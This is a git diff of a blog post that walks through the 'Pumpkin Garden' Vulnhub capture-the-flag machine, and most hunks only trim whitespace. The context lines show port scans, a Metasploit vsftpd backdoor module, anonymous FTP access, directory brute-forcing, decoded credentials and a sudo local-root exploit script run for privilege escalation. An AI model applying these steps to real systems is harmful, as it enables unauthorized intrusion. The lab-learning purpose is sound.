@@ -3,6 +3,7 @@ layout: post
 title:  "Breaking Into The Pumpkin Garden"
 excerpt: "Cracking the pumpkin garden virtual box"
 date: 2019-12-20 02:15:20 -0500
+author: "Jake Gallow"
 ---
 &nbsp;&nbsp;&nbsp;&nbsp;Today I'm taking a crack at breaking into the [Pumpkin Garden Vulnhub image](https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkingarden,321/#description), an introductory level virtual machine for CTFs.
  Where this post does eventually arrive at a solution, it is an explanation of the process so I can find points of improvement.
@@ -23,8 +24,8 @@ PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.0.8 or later
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to 192.168.1.117
 |      Logged in as ftp
@@ -53,7 +54,7 @@ Matching Modules
    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
 
 
-msf5 > use exploit/unix/ftp/vsftpd_234_backdoor 
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.1.185
 RHOST => 192.168.1.185
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
@@ -92,8 +93,8 @@ PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 2.0.8 or later
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to 192.168.1.117
 |      Logged in as ftp
@@ -109,7 +110,7 @@ PORT     STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.7 (Ubuntu)
 |_http-title: Mission-Pumpkin
 3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 d8:8d:e7:48:3a:3c:91:0e:3f:43:ea:a3:05:d8:89:e2 (DSA)
 |   2048 f0:41:8f:e0:40:e3:c0:3a:1f:4d:4f:93:e6:63:24:9e (RSA)
 |   256 fa:87:57:1b:a2:ba:92:76:0c:e7:85:e7:f5:3d:54:b1 (ECDSA)
@@ -122,16 +123,16 @@ Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
 
 &nbsp;&nbsp;&nbsp;&nbsp;Maybe there is a front door approach.
  Maybe the ftp service has default credentials.
- According  to [Microsoft's documentation on anonymous authentication over ftp](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/ftpserver/security/authentication/anonymousauthentication) anonymous ftp uses the username anonymous and either an empty password or anonymous as the password. 
+ According  to [Microsoft's documentation on anonymous authentication over ftp](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/ftpserver/security/authentication/anonymousauthentication) anonymous ftp uses the username anonymous and either an empty password or anonymous as the password.
  I'll try that.
 
 ```
 ftp 192.168.1.185                                                                                           [20:04:22]
 Connected to 192.168.1.185.
 220 Welcome to Pumpkin's FTP service.
-Name (192.168.1.185:ragnyll): anonymous 
+Name (192.168.1.185:ragnyll): anonymous
 331 Please specify the password.
-Password: 
+Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
@@ -141,7 +142,7 @@ Using binary mode to transfer files.
 
 ```
 cat note.txt                                                                                                [20:13:11]
-Hello Dear! 
+Hello Dear!
 Looking for route map to PumpkinGarden? I think jack can help you find it.
 ```
 
@@ -161,7 +162,7 @@ Looking for route map to PumpkinGarden? I think jack can help you find it.
 
 &nbsp;&nbsp;&nbsp;&nbsp;I'm not gonna lie on this part.
  I don't really know many tools and I'll just cheat a bit to get through this one so I know what to go after next.
- I'll read the docs after the fact. 
+ I'll read the docs after the fact.
  I just tried to get the name of the tool to use and not look at any extra stuff...
 
 &nbsp;&nbsp;&nbsp;&nbsp;Apparently next tool people use is `dirb` which scans web content on http servers by using a dictionary attack.
@@ -173,7 +174,7 @@ Looking for route map to PumpkinGarden? I think jack can help you find it.
 dirb http://192.168.1.185:1515/ common.txt                                                                  [21:13:43]
 
 -----------------
-DIRB v2.22    
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -183,17 +184,17 @@ WORDLIST_FILES: common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://192.168.1.185:1515/ ----
-==> DIRECTORY: http://192.168.1.185:1515/img/                                                                            
-+ http://192.168.1.185:1515/index.html (CODE:200|SIZE:903)                                                               
-+ http://192.168.1.185:1515/server-status (CODE:403|SIZE:295)                                                            
-                                                                                                                         
+==> DIRECTORY: http://192.168.1.185:1515/img/
++ http://192.168.1.185:1515/index.html (CODE:200|SIZE:903)
++ http://192.168.1.185:1515/server-status (CODE:403|SIZE:295)
+
 ---- Entering directory: http://192.168.1.185:1515/img/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                               
+
 -----------------
 END_TIME: Fri Dec 20 21:13:44 2019
 DOWNLOADED: 4612 - FOUND: 2
@@ -204,7 +205,7 @@ I'm going to take a look at those
 The cat asked me to look at pumpkins (just like in that comment earlier), and theres also hidden secret which looks promising.
 
 
-and there is a clue in the hidden folder. 
+and there is a clue in the hidden folder.
 
 ```
 c2NhcmVjcm93IDogNVFuQCR5
@@ -232,7 +233,7 @@ Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from Lord
  lol I actually can log into goblin with those creds. In goblins home directory there another note...
 
 ```
-Hello Friend! I heard that you are looking for PumpkinGarden key. 
+Hello Friend! I heard that you are looking for PumpkinGarden key.
 But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
 You can reach there through my backyard.
 
@@ -245,7 +246,7 @@ https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
 &nbsp;&nbsp;&nbsp;&nbsp;Shit.
 
 &nbsp;&nbsp;&nbsp;&nbsp;This seems like an acceptable time to cheat.
- The file I need to complete the exercise doesn't exist, so I just grabbed it from someone's [walkthrough](https://www.hackingarticles.in/pumpkingarden-vulnhub-walkthrough/). 
+ The file I need to complete the exercise doesn't exist, so I just grabbed it from someone's [walkthrough](https://www.hackingarticles.in/pumpkingarden-vulnhub-walkthrough/).
 
 ```
 #!/bin/sh
@@ -294,8 +295,8 @@ root      1505  1498  0 12:11 ?        00:00:00 /bin/sh -c sleep 30; rm /home/go
 &nbsp;&nbsp;&nbsp;&nbsp;Unfortunately scarecow is not sudo, so I cant run it, but goblin has sudo, so I could run the file from scarecrow using sudo from goblins account.
 
 ```
-goblin@Pumpkin:~$ sudo /home/scarecrow/script.sh file.txt     
-[sudo] password for goblin: 
+goblin@Pumpkin:~$ sudo /home/scarecrow/script.sh file.txt
+[sudo] password for goblin:
 Tod Miller Sudo local root exploit
 by Slouching
 automated by kingcope
